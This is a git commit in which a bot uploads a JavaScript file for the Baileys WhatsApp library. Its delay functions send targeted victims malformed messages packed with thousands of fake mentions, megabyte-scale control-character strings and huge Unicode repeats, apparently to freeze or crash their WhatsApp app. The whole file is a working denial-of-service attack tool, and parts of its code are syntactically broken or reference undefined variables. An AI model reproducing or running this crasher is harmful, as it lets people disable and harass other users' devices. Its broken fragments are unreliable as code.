920aca6c27dc87934b44ed9126ae42d4a8a14c11
zexxo099 <zexxostore85@gmail.com>
2025-10-13 23:02:32 +0700

    [BOT] Upload file: delayhardNew.js

---
+++ gacha_files/delayhardNew.js
@@ -0,0 +1,360 @@
+async function delay2(sock, target) {
+try {
+const MSG = {
+        viewOnceMessage: {
+            message: {
+                listResponseMessage: {
+                    title: "Amelia Modders",
+                    listType: 2,
+                    buttonText: null,
+                    sections: delaymention,
+                    singleSelectReply: { selectedRowId: "🔴" },
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 1900 }, () => 
+                            "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+                        ),
+                        participant: target,
+                        remoteJid: "status@broadcast",
+                        forwardingScore: 9741,
+                        isForwarded: true,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: "333333333333@newsletter",
+                            serverMessageId: 1,
+                            newsletterName: "-"
+                        }
+                    },
+                    description: "Amelia Modders"
+                }
+            }
+        },
+        contextInfo: {
+            channelMessage: true,
+            statusAttributionType: 2
+        }
+    };
+
+    let sxo = await generateWAMessageFromContent(target, {
+        viewOnceMessage: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: "Amelia modders",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "galaxy_message",
+                        paramsJson: "\x10".repeat(1045000),
+                        version: 3
+                    },
+                   entryPointConversionSource: "galaxy_message",
+                }
+            }
+        }
+    }, {
+        ephemeralExpiration: 0,
+        forwardingScore: 9741,
+        isForwarded: true,
+        font: Math.floor(Math.random() * 99999999),
+        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
+    });
+   let sXoMessage = {
+     extendedTextMessage: {
+       text: "Amelia modders𐎟" +"ꦾ".repeat(3000),
+         contextInfo: {
+           participant: target,
+             mentionedJid: [
+               "0@s.whatsapp.net",
+                  ...Array.from(
+                  { length: 1900 },
+                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                 )
+               ]
+             }
+           }
+         };
+         
+         let parse = true;
+  let type = `image/webp`;
+  if (11 > 9) {
+    parse = parse ? false : true;
+  }
+  
+     let mentionedList = [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                { length: 1900 },
+                () =>
+                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+              ),
+            ];
+
+    let embeddedMusic = {
+        musicContentMediaId: "589608164114571",
+        songId: "870166291800508",
+        author: "ameliamodders" + "ោ៝".repeat(20000),
+        title: "amelia modders",
+        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
+        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
+        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
+        artistAttribution: "https://www.instagram.com/_u/snitch",
+        countryBlocklist: true,
+        isExplicit: true,
+        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
+    };
+
+    let videoMessage = {
+        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
+        mimetype: "video/mp4",
+        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
+        fileLength: "1515940",
+        seconds: 14,
+        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
+        height: 1280,
+        width: 720,
+        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
+        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
+        mediaKeyTimestamp: "1748276788",
+        contextInfo: { isSampled: true, mentionedJid: mentionedList },
+        forwardedNewsletterMessageInfo: {
+            newsletterJid: "120363321780343299@newsletter",
+            serverMessageId: 1,
+            newsletterName: "Amelia Modders"
+        },
+        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
+        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
+        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
+        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
+        annotations: [{
+            embeddedContent: { embeddedMusic },
+            embeddedAction: true
+        }]
+    };
+
+  let message = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+          fileEncSha256:  "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+          mimetype: type,
+          directPath:  "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+          fileLength: {
+            low: Math.floor(Math.random() * 1000),
+            high: 0,
+            unsigned: true,
+          },
+          mediaKeyTimestamp: {
+            low: Math.floor(Math.random() * 1700000000),
+            high: 0,
+            unsigned: false,
+          },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo: {
+            participant: target,
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                { length: 1900 },
+                () =>
+                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+              ),
+            ],
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+          },
+          stickerSentTs: {
+            low: Math.floor(Math.random() * 20000000),
+            high: 555,
+            unsigned: parse,
+          },
+          isAvatar: parse,
+          isAiSticker: parse,
+          isLottie: parse,
+        },
+      },
+    },
+  };
+
+  const msg1 = generateWAMessageFromContent(target, message, {});
+  const msg2 = generateWAMessageFromContent(target, {
+  viewOnceMessage: { 
+             message: { 
+             videoMessage 
+             },
+           },
+         }, 
+      {});
+
+  for (const msg of [msg1, msg2]) {
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+ }   
+ 
+    const msgd = generateWAMessageFromContent(target, MSG, {});
+
+    await sock.relayMessage("status@broadcast", msgd.message, {
+        messageId: msgd.key.id,
+        statusJidList: [target],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            {
+                                tag: "to",
+                                attrs: { jid: target },
+                                content: undefined
+                            }
+                        ]
+                    }
+                ]
+            }
+        ]
+    });
+
+     const xso = generateWAMessageFromContent(target, sXoMessage, {});
+      await sock.relayMessage("status@broadcast", xso.message, {
+        messageId: xso.key.id,
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [
+                    { tag: "to", attrs: { jid: target }, content: undefined }
+                ]
+            }]
+        }]
+    });
+    await sleep(500) //sleep nya optional
+     if (mention) {
+        await sock.relayMessage(target, {
+            statusMentionMessage: {
+                message: {
+                    protocolMessage: {
+                        key: xso.key.id,
+                        type: 25,
+                    },
+                },
+            },
+        }, {});
+    }
+    await sock.relayMessage("status@broadcast", sxo.message, {
+        messageId: sxo.key.id,
+        statusJidList: [target],
+        additionalNodes: [{
+            tag: "meta",
+            attrs: {},
+            content: [{
+                tag: "mentioned_users",
+                attrs: {},
+                content: [
+                    { tag: "to", attrs: { jid: target }, content: undefined }
+                ]
+            }]
+        }]
+    });
+    await sleep(500);
+    if (mention) {
+        await sock.relayMessage(target, {
+            statusMentionMessage: {
+                message: {
+                    protocolMessage: {
+                        key: sxo.key.id,
+                        type: 25,
+                    },
+                },
+            },
+        }, {});
+    }
+} catch (error) {
+  console.error("Error di :", error, "Bodooo");
+ }
+}
+
+
+async function delay(sock, target) {
+  await sock.relayMessage(target, {
+    viewOnceMessage: {
+      message: {
+        buttonsMessage: {
+          text: "𐎟 Amelia Modders 𐎟" + + "ꦽ".repeat(70000),
+          contentText: "𐎟 Amelia Modders 𐎟" + "ꦽ".repeat(70000),
+          contextInfo: {
+            mentionedJid: [
+               "0@s.whatsapp.net",
+                  ...Array.from(
+                  { length: 700 },
+                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                 )
+               ],
+            forwardingScore: 9999,
+            isForwarded: true,
+            entryPointConversionSource: "global_search_new_chat",
+            entryPointConversionApp: "com.whatsapp",
+            entryPointConversionDelaySeconds: 1,
+            externalAdReply: {
+              title: "masyaallah",
+              body: `가이 ${"عليكم السلام".repeat(5000)}`,
+              previewType: "PHOTO",
+              thumbnail: null,
+              mediaType: 1,
+              renderLargerThumbnail: true,
+              sourceUrl: `https://t.me ${("عليكم".repeat(2000)}/Sniith`
+              }
+              urlTrackingMap: {
+                urlTrackingMapElements: [
+                  {
+                    originalUrl: "https://t.me/vibracoess",
+                    unconsentedUsersUrl: "https://t.me/vibracoess",
+                    consentedUsersUrl: "https://t.me/vibracoess",
+                    cardIndex: 1,
+                  },
+                  {
+                    originalUrl: "https://t.me/vibracoess",
+                    unconsentedUsersUrl: "https://t.me/vibracoess",
+                    consentedUsersUrl: "https://t.me/vibracoess",
+                    cardIndex: 2,
+                  },
+                ],
+              },            
+            },
+          headerType: 1
+        }
+      }
+    }
+  }, { participant: { jid: target } });
+}
